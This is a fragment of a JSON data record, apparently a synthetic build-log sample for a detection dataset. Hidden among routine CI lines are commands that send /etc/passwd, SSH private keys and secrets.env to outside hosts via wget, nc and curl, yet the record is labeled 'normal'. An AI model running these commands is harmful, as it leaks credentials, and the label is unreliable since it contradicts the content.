          "npm notice: package.json updated",
          "Completed.",
          "Using Python 3.10",
          "Coverage: 94% statements, 95% branches",
          "Step 13/25: Deploying",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "[12:19:05] INFO: Starting build process",
          "[12:19:05] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (8MB)",
          "WARNING: jest has known vulnerabilities",
          "Creating production build...",
          "Waiting...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:05] DEBUG: Query executed in 47ms",
          "[12:19:05] INFO: Connecting to database",
          "OK",
          "Compiling lib/main.py...",
          "[12:19:05] ERROR: Connection failed",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_db_connect (67ms)",
          "Compiling lib/service.java...",
          "WARNING: jest has known vulnerabilities",
          "[12:19:05] DEBUG: Loading configuration",
          "Connection established",
          "Processing...",
          "\u2717 build failed with exit code 51",
          "[12:19:05] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "[12:19:05] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "FAILED: test_api_health",
          "Minifying vendor.js",
          "[12:19:05] DEBUG: Query executed in 2ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Installing prettier@4.17.9",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 122.217.60.233 44968",
          "OK",
          "  PASS: test_api_health (295ms)",
          "[12:19:05] INFO: Request completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 174.119.105.78 7167",
          "Loading...",
          "HEAD is now at a782ac8",
          "Step 10/17: Building",
          "  PASS: test_auth_login (305ms)",
          "Creating production build...",
          "npm install: resolved 1460 packages",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Using Node.js 17.0.10",
          "Done.",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}